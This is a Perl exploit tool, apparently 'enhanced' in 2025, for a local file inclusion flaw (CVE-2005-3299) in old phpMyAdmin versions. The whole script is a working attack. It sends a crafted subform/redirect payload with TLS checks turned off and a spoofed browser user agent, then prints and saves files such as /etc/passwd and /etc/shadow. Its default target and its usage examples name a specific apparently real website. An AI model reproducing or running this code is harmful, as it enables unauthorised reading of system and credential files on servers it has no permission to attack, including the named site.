#!/usr/bin/perl
#########################################################################
# MyPHPAdmin Exploit Tool v2.0
# CVE-2005-3299
# 
# Enhanced Local File Inclusion Exploit for phpMyAdmin 2.6.4-pl1
# Targets vulnerable grab_globals.lib.php implementation
#
# Originally by Maksymilian Arciemowicz (cXIb8O3)
# Enhanced and updated by Kasau (2025)
#
# Usage: perl exploit.pl <options>
#########################################################################

use strict;
use warnings;
use IO::Socket::SSL;
use Term::ANSIColor qw(:constants);
use Getopt::Long;
use MIME::Base64;
use File::Basename;
use LWP::UserAgent;

# Default configuration
my $target = "https://watuafrica.com/phpmyadmin/index.php";
my $pma_path = "/phpmyadmin/";
my $file_to_read = "../../../../../etc/passwd";
my $output_file = "";
my $verbose = 0;
my $help = 0;

# Parse command line options
GetOptions(
    "target|t=s"   => \$target,
    "path|p=s"     => \$pma_path,
    "file|f=s"     => \$file_to_read,
    "output|o=s"   => \$output_file,
    "verbose|v"    => \$verbose,
    "help|h"       => \$help
);

# Print banner and help if requested
&print_banner();
if ($help) {
    &print_help();
    exit(0);
}

# Extract host from target URL
my $HOST = $target;
$HOST =~ s/^(https?:\/\/)//;
$HOST =~ s/\/.*$//;

# Parse URL to get protocol and path
my $protocol = ($target =~ /^https:/) ? "https" : "http";
my $port = ($protocol eq "https") ? 443 : 80;

# Default path if not provided
$pma_path =~ s/\/$//; # Remove trailing slash if present
$pma_path .= "/libraries/grab_globals.lib.php" unless $pma_path =~ /grab_globals\.lib\.php$/;

print BOLD, BRIGHT_BLUE, "[*] Target: ", RESET, "$protocol://$HOST$pma_path\n";
print BOLD, BRIGHT_BLUE, "[*] File to read: ", RESET, "$file_to_read\n";
print BOLD, BRIGHT_BLUE, "[*] Output file: ", RESET, "$output_file\n" if $output_file;
print "\n";

# Craft exploit payload
my $payload = "usesubform[1]=1&usesubform[2]=1&subform[1][redirect]=$file_to_read&subform[1][kasau]=1";

# Create a UserAgent for handling HTTPS properly
print BOLD, BRIGHT_BLUE, "[*] Setting up secure connection to $HOST...\n", RESET;

my $ua = LWP::UserAgent->new(
    ssl_opts => { 
        verify_hostname => 0,
        SSL_verify_mode => 0,
    },
    timeout => 30
);

$ua->agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36");

print BOLD, BRIGHT_GREEN, "[+] Connection prepared!\n", RESET;
print BOLD, BRIGHT_BLUE, "[*] Sending payload...\n", RESET if $verbose;

# Send the HTTPS request
my $full_url = "$protocol://$HOST$pma_path";
my $request = HTTP::Request->new(POST => $full_url);
$request->content_type('application/x-www-form-urlencoded');
$request->content($payload);

my $response = $ua->request($request);
print BOLD, BRIGHT_BLUE, "[*] Payload sent! Processing response...\n", RESET;

# Get response content
my $response_content = $response->decoded_content;

# Check for success
if ($response->code != 200) {
    print BOLD, BRIGHT_RED, "[-] HTTP Error: " . $response->code . " - " . $response->message . "\n", RESET;
    if ($response->code == 400 && $response_content =~ /plain HTTP request was sent to HTTPS port/) {
        print BOLD, BRIGHT_RED, "[-] SSL/TLS Error: The server requires HTTPS but we encountered an issue with the SSL handshake.\n", RESET;
        print BOLD, BRIGHT_RED, "    This could be due to Cloudflare protection or other SSL configuration issues.\n", RESET;
    }
    print BOLD, BRIGHT_YELLOW, "[*] Response content for debugging:\n", RESET if $verbose;
    print $response_content . "\n" if $verbose;
    exit(1);
}

# Extract file content from response
my $file_content = $response_content;

# Check if file couldn't be accessed
if ($file_content =~ /<b>Warning<\/b>: main\(\): Unable to access .\/$file_to_read in <b>/) {
    print BOLD, BRIGHT_RED, "[-] File $file_to_read does not exist or is not accessible.\n", RESET;
    exit(1);
}

# Check if we have a vulnerability error message that indicates success
if ($file_content =~ /<b>Warning<\/b>:.*?failed to open stream/i) {
    print BOLD, BRIGHT_RED, "[-] Failed to read the file. Server might not be vulnerable.\n", RESET;
    exit(1);
} 

# Try to clean the output - this is basic and might need adjustments
$file_content =~ s/.*?<\?php.*?\?>(.*)/$1/s;
$file_content =~ s/<.*?>//g; # Remove HTML tags

# Display results
print BOLD, BRIGHT_GREEN, "[+] Exploitation successful!\n", RESET;
print BOLD, BRIGHT_BLUE, "[*] File content:\n", RESET;
print "=" x 80, "\n";
print $file_content;
print "=" x 80, "\n";

# Save to file if specified
if ($output_file) {
    open(my $fh, '>', $output_file) or die BOLD, BRIGHT_RED, "[-] Cannot open file '$output_file': $!\n", RESET;
    print $fh $file_content;
    close($fh);
    print BOLD, BRIGHT_GREEN, "[+] Output saved to $output_file\n", RESET;
}

print BOLD, BRIGHT_GREEN, "[+] Exploit completed.\n", RESET;
exit(0);

#########################################################################
# Subroutines
#########################################################################

sub print_banner {
    print "\n";
    print BOLD, BRIGHT_MAGENTA, "╔═══════════════════════════════════════════════════════════════════╗\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║                                                                   ║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║  ", BRIGHT_WHITE, "███╗   ███╗██╗   ██╗██████╗ ██╗  ██╗██████╗  █████╗ ██████╗  ", BRIGHT_MAGENTA, "║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║  ", BRIGHT_WHITE, "████╗ ████║╚██╗ ██╔╝██╔══██╗██║  ██║██╔══██╗██╔══██╗██╔══██╗ ", BRIGHT_MAGENTA, "║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║  ", BRIGHT_WHITE, "██╔████╔██║ ╚████╔╝ ██████╔╝███████║██████╔╝███████║██║  ██║ ", BRIGHT_MAGENTA, "║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║  ", BRIGHT_WHITE, "██║╚██╔╝██║  ╚██╔╝  ██╔═══╝ ██╔══██║██╔═══╝ ██╔══██║██║  ██║ ", BRIGHT_MAGENTA, "║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║  ", BRIGHT_WHITE, "██║ ╚═╝ ██║   ██║   ██║     ██║  ██║██║     ██║  ██║██████╔╝ ", BRIGHT_MAGENTA, "║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║  ", BRIGHT_WHITE, "╚═╝     ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝  ", BRIGHT_MAGENTA, "║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║                                                                   ║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "╠═══════════════════════════════════════════════════════════════════╣\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║ ", BRIGHT_YELLOW, "        Local File Inclusion Exploit for phpMyAdmin           ", BRIGHT_MAGENTA, " ║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║ ", BRIGHT_YELLOW, "                      CVE-2005-3299                           ", BRIGHT_MAGENTA, " ║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "║ ", BRIGHT_YELLOW, "               Enhanced by Kasau (2025)                       ", BRIGHT_MAGENTA, " ║\n", RESET;
    print BOLD, BRIGHT_MAGENTA, "╚═══════════════════════════════════════════════════════════════════╝\n", RESET;
    print "\n";
}

sub print_help {
    print BOLD, "USAGE:\n", RESET;
    print "  perl ", basename($0), " [options]\n\n";
    
    print BOLD, "OPTIONS:\n", RESET;
    print "  -t, --target URL    Target URL (default: $target)\n";
    print "  -p, --path PATH     Path to phpMyAdmin (default: $pma_path)\n";
    print "  -f, --file FILE     File to read (default: $file_to_read)\n";
    print "  -o, --output FILE   Save output to file\n";
    print "  -v, --verbose       Enable verbose output\n";
    print "  -h, --help          Display this help message\n\n";
    
    print BOLD, "EXAMPLES:\n", RESET;
    print "  perl ", basename($0), " -t http://example.com -p /phpmyadmin/ -f ../../../../../etc/passwd\n";
    print "  perl ", basename($0), " -t https://watuafrica.com -p /phpmyadmin/ -f ../../../../../etc/shadow -o shadow.txt\n\n";
    
    print BOLD, "NOTES:\n", RESET;
    print "  For HTTPS sites, ensure the required Perl modules are installed:\n";
    print "  - LWP::UserAgent\n";
    print "  - IO::Socket::SSL\n";
    print "  - Term::ANSIColor\n\n";
    print "  Install them using: cpan -i LWP::UserAgent IO::Socket::SSL Term::ANSIColor\n\n";

}
